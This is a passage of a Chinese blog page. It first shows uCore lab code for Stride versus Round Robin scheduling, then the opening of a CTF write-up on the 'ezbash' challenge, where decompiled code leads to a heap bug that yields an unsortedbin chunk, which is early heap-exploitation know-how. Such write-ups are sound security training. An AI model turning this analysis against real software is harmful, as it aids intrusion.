<li>PS：至于为什么要这样搞，这就是数学家用公式算出来的，有关数学公式的理论本人一概不会</li>
</ul>
<p>具体的过程我就随便抄了一个：（其实我也写了一个，就不献丑了）</p>
<ul>
<li>在 proc_struct 中添加总共N个多级反馈队列的入口，每个队列都有着各自的优先级，编号越大的队列优先级约低，并且优先级越低的队列上时间片的长度越大，为其上一个优先级队列的两倍；并且在PCB中记录当前进程所处的队列的优先级</li>
<li>处理调度算法初始化的时候需要同时对N个队列进行初始化</li>
<li>在处理将进程加入到就绪进程集合的时候，观察这个进程的时间片有没有使用完，如果使用完了，就将所在队列的优先级调低，加入到优先级低1级的队列中去，如果没有使用完时间片，则加入到当前优先级的队列中去</li>
<li>在同一个优先级的队列内使用时间片轮转算法</li>
<li>在选择下一个执行的进程的时候，有限考虑高优先级的队列中是否存在任务，如果不存在才转而寻找较低优先级的队列（有可能导致饥饿）</li>
<li>从就绪进程集合中删除某一个进程就只需要在对应队列中删除即可</li>
<li>处理时间中断的函数不需要改变</li>
</ul>
<h2 id="练习2-实现-Stride-Scheduling-调度算法"><a href="#练习2-实现-Stride-Scheduling-调度算法" class="headerlink" title="练习2-实现 Stride Scheduling 调度算法"></a>练习2-实现 Stride Scheduling 调度算法</h2><p>uCore 的 Round-Robin 算法可以保证每个进程得到的 CPU 资源是相等的，但我们希望调度器能够更加智能的为每个进程分配合理的 CPU 资源，让 <strong>每个进程得到的时间资源与它们的优先级成正比关系</strong> ，而 Stride Scheduling 调度算法就是这样的一种典型而简单的算法</p>
<p>其中，该算法的有如下几个特点：</p>
<ul>
<li>可控性：可以证明 Stride Scheduling 对进程的调度次数正比于其优先级</li>
<li>确定性：在不考虑计时器事件的情况下，整个调度机制都是可预知和重现的</li>
</ul>
<p>算法简析：</p>
<p>在实验中使用的 Stride Scheduling 算法是结合时间片的一种优先级调度策略，每一个时间片结束时，选择就绪状态的进程中 Pass 值最小的进程分配一个时间片，在一个时间段中进程所获得的时间片数量和进程的优先级大致成正比</p>
<p>该算法的基本思想如下：</p>
<ul>
<li>为每个 runnable 的进程设置一个当前状态 stride，表示该进程当前的调度权，另外定义其对应的 pass 值，表示对应进程在调度后 stride 需要进行的累加值</li>
<li>每次需要调度时，从当前 runnable 态的进程中选择 stride 最小的进程调度</li>
<li>对于获得调度的进程P，将对应的 stride 加上其对应的步长 pass（只与进程的优先权有关系）</li>
<li>在一段固定的时间之后，重新调度当前 stride 最小的进程（返回步骤二）</li>
</ul>
<p>总之：</p>
<p>其实就是模仿 Round Robin 调度算法来重新写一个 Stride Scheduling，具体的优化策略需要结合一些数学理论，所以我直接抄答案了，并在答案中理解该算法</p>
<p>下面便是具体的实现过程：（有和 Round Robin 的对比）</p>
<p>一，<code>stride_init</code>：进行初始化操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">stride_init</span><span class="params">(struct run_queue *rq)</span> </span>&#123;</span><br><span class="line">     list_init(&amp;(rq-&gt;run_list)); <span class="comment">/* 置空链表 */</span></span><br><span class="line">     rq-&gt;lab6_run_pool = <span class="literal">NULL</span>; <span class="comment">/* 运行池中的条目初始化为空 */</span></span><br><span class="line">     rq-&gt;proc_num = <span class="number">0</span>; <span class="comment">/* 进程总数变为&#x27;0&#x27; */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="comment">/* 对比Round Robin */</span></span><br><span class="line">RR_init(struct run_queue *rq) &#123;</span><br><span class="line">    list_init(&amp;(rq-&gt;run_list)); <span class="comment">/* 置空链表 */</span></span><br><span class="line">    rq-&gt;proc_num = <span class="number">0</span>; <span class="comment">/* 进程总数变为&#x27;0&#x27; */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>二，<code>stride_enqueue</code>：用于将某个进程添加进传入的队列中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">stride_enqueue</span><span class="params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">     rq-&gt;lab6_run_pool =</span><br><span class="line">          skew_heap_insert(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f); </span><br><span class="line">     <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) &#123;</span><br><span class="line">          proc-&gt;time_slice = rq-&gt;max_time_slice; <span class="comment">/* 初始化时间片(如果进程在当前的执行时间片已经用完,需要等到下一次有机会运行时才能再执行一段时间) */</span></span><br><span class="line">     &#125;</span><br><span class="line">     proc-&gt;rq = rq; <span class="comment">/* 更新运行队列 */</span></span><br><span class="line">     rq-&gt;proc_num ++; <span class="comment">/* 运行队列中的进程数增加 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">RR_enqueue</span><span class="params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    assert(list_empty(&amp;(proc-&gt;run_link)));</span><br><span class="line">    list_add_before(&amp;(rq-&gt;run_list), &amp;(proc-&gt;run_link)); <span class="comment">/* 插入结点前 */</span></span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) &#123;</span><br><span class="line">        proc-&gt;time_slice = rq-&gt;max_time_slice; <span class="comment">/* 初始化时间片(如果进程在当前的执行时间片已经用完,需要等到下一次有机会运行时才能再执行一段时间) */</span></span><br><span class="line">  &#125;</span><br><span class="line">    proc-&gt;rq = rq; <span class="comment">/* 更新运行队列 */</span></span><br><span class="line">    rq-&gt;proc_num ++; <span class="comment">/* 运行队列中的进程数增加 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>三，<code>stride_dequeue</code>：用于将某个进程从传入的队列中移除</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">stride_dequeue</span><span class="params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">     rq-&gt;lab6_run_pool =</span><br><span class="line">          skew_heap_remove(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);</span><br><span class="line">     rq-&gt;proc_num --; <span class="comment">/* 运行队列中的进程数减少 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">RR_dequeue</span><span class="params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    assert(!list_empty(&amp;(proc-&gt;run_link)) &amp;&amp; proc-&gt;rq == rq);</span><br><span class="line">    list_del_init(&amp;(proc-&gt;run_link)); <span class="comment">/* 脱链 */</span></span><br><span class="line">    rq-&gt;proc_num --; <span class="comment">/* 运行队列中的进程数减少 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>四，<code>stride_pick_next</code>：涉及到了选取最小 <code>Stride</code> 值的进程，以及 <code>stride</code> 值的更新</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *</span></span><br><span class="line"><span class="function"><span class="title">stride_pick_next</span><span class="params">(struct run_queue *rq)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (rq-&gt;lab6_run_pool == <span class="literal">NULL</span>) </span><br><span class="line">         <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">p</span> =</span> le2proc(rq-&gt;lab6_run_pool, lab6_run_pool);</span><br><span class="line">     <span class="keyword">if</span> (p-&gt;lab6_priority == <span class="number">0</span>)</span><br><span class="line">          p-&gt;lab6_stride += BIG_STRIDE;</span><br><span class="line">     <span class="keyword">else</span> p-&gt;lab6_stride += BIG_STRIDE / p-&gt;lab6_priority;</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *</span></span><br><span class="line"><span class="function"><span class="title">RR_pick_next</span><span class="params">(struct run_queue *rq)</span> </span>&#123; <span class="comment">/* [首次适配] */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_next(&amp;(rq-&gt;run_list));</span><br><span class="line">    <span class="keyword">if</span> (le != &amp;(rq-&gt;run_list)) &#123;</span><br><span class="line">        <span class="keyword">return</span> le2proc(le, run_link);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>五，<code>stride_proc_tick</code>：和 <code>RR_proc_tick</code> 一致</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">stride_proc_tick</span><span class="params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;time_slice --; <span class="comment">/* 进行时间片的递减 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">1</span>; <span class="comment">/* 如果用完时间片,那么就使该进程变成可调度状态,等待再次调度 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">RR_proc_tick</span><span class="params">(struct run_queue *rq, struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;time_slice --; <span class="comment">/* 进行时间片的递减 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">1</span>; <span class="comment">/* 如果用完时间片,那么就使该进程变成可调度状态,等待再次调度 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/28/mrCTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/28/mrCTF2022/" class="post-title-link" itemprop="url">mrCTF2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-28 00:42:38" itemprop="dateCreated datePublished" datetime="2022-04-28T00:42:38+08:00">2022-04-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-07-21 11:32:45" itemprop="dateModified" datetime="2022-07-21T11:32:45+08:00">2022-07-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ezbash"><a href="#ezbash" class="headerlink" title="ezbash"></a>ezbash</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./ezbash     </span><br><span class="line">hacker:/$ ls</span><br><span class="line">hacker:/$ whoami</span><br><span class="line">whoami: command <span class="keyword">not</span> found</span><br><span class="line">hacker:/$ </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ezbash: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=de2f75ca05ea6123715bd058488ab232cac69e13, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">   </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/ezbash&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>)</span> stable release versi</span></span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>程序的主体逻辑如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ret; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *command_str; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **command_list; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1B[33mhacker:%s$ \x1B[0m&quot;</span>, dest); <span class="comment">// 打印字符(dest:/.....)</span></span><br><span class="line">    command_str = input_command();</span><br><span class="line">    command_list = (<span class="keyword">const</span> <span class="keyword">char</span> **)break_command(command_str);</span><br><span class="line">    ret = analyse_command(command_list);</span><br><span class="line">    <span class="built_in">free</span>(command_str);</span><br><span class="line">    <span class="built_in">free</span>(command_list);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( ret );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>关键步骤为：输入命令，分割命令，执行命令</li>
</ul>
<p>analyse_command 为执行命令的过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">analyse_command</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> **command_list)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !*command_list )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="keyword">int</span>)num_11(); ++i )         <span class="comment">// 循环12次</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(*command_list, command_list_system[i]) )<span class="comment">// 变量系统提供的命令列表,获取正确的命令</span></span><br><span class="line">      <span class="keyword">return</span> ((__int64 (__fastcall *)(__int64))command_entry[i])((__int64)command_list);<span class="comment">// 执行并返回对应的函数入口地址</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s: command not found\n&quot;</span>, *command_list);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后配合使用“command_list_system”和“command_entry”，找到对应函数的入口</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000564657600020</span> command_list_system dq offset aCd       ; DATA XREF: help+<span class="number">4</span>A↑o</span><br><span class="line">.data:<span class="number">0000564657600020</span>                                         ; analyse_command+<span class="number">3</span>C↑o</span><br><span class="line">.data:<span class="number">0000564657600020</span>                                         ; <span class="string">&quot;cd&quot;</span></span><br><span class="line">.data:<span class="number">0000564657600028</span>                 dq offset aLs           ; <span class="string">&quot;ls&quot;</span></span><br><span class="line">.data:<span class="number">0000564657600030</span>                 dq offset aEcho         ; <span class="string">&quot;echo&quot;</span></span><br><span class="line">.data:<span class="number">0000564657600038</span>                 dq offset aCat          ; <span class="string">&quot;cat&quot;</span></span><br><span class="line">.data:<span class="number">0000564657600040</span>                 dq offset aTouch        ; <span class="string">&quot;touch&quot;</span></span><br><span class="line">.data:<span class="number">0000564657600048</span>                 dq offset aRm           ; <span class="string">&quot;rm&quot;</span></span><br><span class="line">.data:<span class="number">0000564657600050</span>                 dq offset aMkdir        ; <span class="string">&quot;mkdir&quot;</span></span><br><span class="line">.data:<span class="number">0000564657600058</span>                 dq offset aCp           ; <span class="string">&quot;cp&quot;</span></span><br><span class="line">.data:<span class="number">0000564657600060</span>                 dq offset aPwd          ; <span class="string">&quot;pwd&quot;</span></span><br><span class="line">.data:<span class="number">0000564657600068</span>                 dq offset aHelp         ; <span class="string">&quot;help&quot;</span></span><br><span class="line">.data:<span class="number">0000564657600070</span>                 dq offset aExit_0       ; <span class="string">&quot;exit&quot;</span></span><br><span class="line">.data:<span class="number">0000564657600078</span>                 align <span class="number">20</span>h</span><br><span class="line">.data:<span class="number">0000564657600080</span> command_entry   dq offset cd            ; DATA XREF: analyse_command+<span class="number">6</span>A↑o</span><br><span class="line">.data:<span class="number">0000564657600080</span>                                         ; analyse_command+<span class="number">71</span>↑r</span><br><span class="line">.data:<span class="number">0000564657600080</span>                 dq offset ls</span><br><span class="line">.data:<span class="number">0000564657600080</span>                 dq offset echo</span><br><span class="line">.data:<span class="number">0000564657600080</span>                 dq offset cat</span><br><span class="line">.data:<span class="number">0000564657600080</span>                 dq offset touch</span><br><span class="line">.data:<span class="number">0000564657600080</span>                 dq offset rm</span><br><span class="line">.data:<span class="number">0000564657600080</span>                 dq offset mkdir</span><br><span class="line">.data:<span class="number">0000564657600080</span>                 dq offset cp</span><br><span class="line">.data:<span class="number">0000564657600080</span>                 dq offset pwd</span><br><span class="line">.data:<span class="number">0000564657600080</span>                 dq offset help</span><br><span class="line">.data:<span class="number">0000564657600080</span>                 dq offset exit_s</span><br><span class="line">.data:<span class="number">0000564657600080</span> _data           ends</span><br></pre></td></tr></table></figure>
<p>外部看上去没有漏洞，问题就可能出现在“command_entry”里面的这些函数了，接下来就一个一个分析它们</p>
<p>分析完所有代码后，终于发现了BUG：</p>
<ul>
<li>如果输入的命令特别长，就会获取一个 unsortedbin</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ret; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *command_str; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> **command_list; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1B[33mhacker:%s$ \x1B[0m&quot;</span>, path); <span class="comment">// 打印字符(dest:/.....)</span></span><br><span class="line">    command_str = input_command(); <span class="comment">/* 输入命令 */</span></span><br><span class="line">    command_list = break_command(command_str); <span class="comment">/* 分割命令 */</span></span><br><span class="line">    ret = analyse_command(command_list); <span class="comment">/* 分析命令 */</span></span><br><span class="line">    <span class="built_in">free</span>(command_str); <span class="comment">/* 释放&quot;command_str&quot;(输入的命令) */</span></span><br><span class="line">    <span class="built_in">free</span>(command_list); <span class="comment">/* 释放&quot;command_list&quot;(分割后的命令) */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( ret );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">input_command</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> command_len; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> command; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *command_str; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  command_len = <span class="number">336</span>;</span><br><span class="line">  index = <span class="number">0</span>;</span><br><span class="line">  command_str = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x150</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !command_str )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;ezbash: allocation error\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x19</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    command = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( command == <span class="number">-1</span> || command == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    command_str[index++] = command;</span><br><span class="line">    <span class="keyword">if</span> ( index &gt;= command_len )                 <span class="comment">// 杜绝了off-by-one</span></span><br><span class="line">    &#123;</span><br><span class="line">      command_len += <span class="number">336</span>;</span><br><span class="line">      command_str = (<span class="keyword">char</span> *)<span class="built_in">realloc</span>(command_str, command_len);<span class="comment">// realloc重新分配(只大不小)</span></span><br><span class="line">      <span class="keyword">if</span> ( !command_str )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;ezbash: allocation error\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x19</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  command_str[index] = <span class="number">0</span>;                       <span class="comment">// 末尾置空,但不能off-by-one</span></span><br><span class="line">  <span class="keyword">return</span> command_str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 input_command 中，分配的空间可以动态增长</li>
<li>函数 pwn 的最后会把分配的空间 free 掉</li>
<li>这就产生了 unsortedbin</li>
</ul>
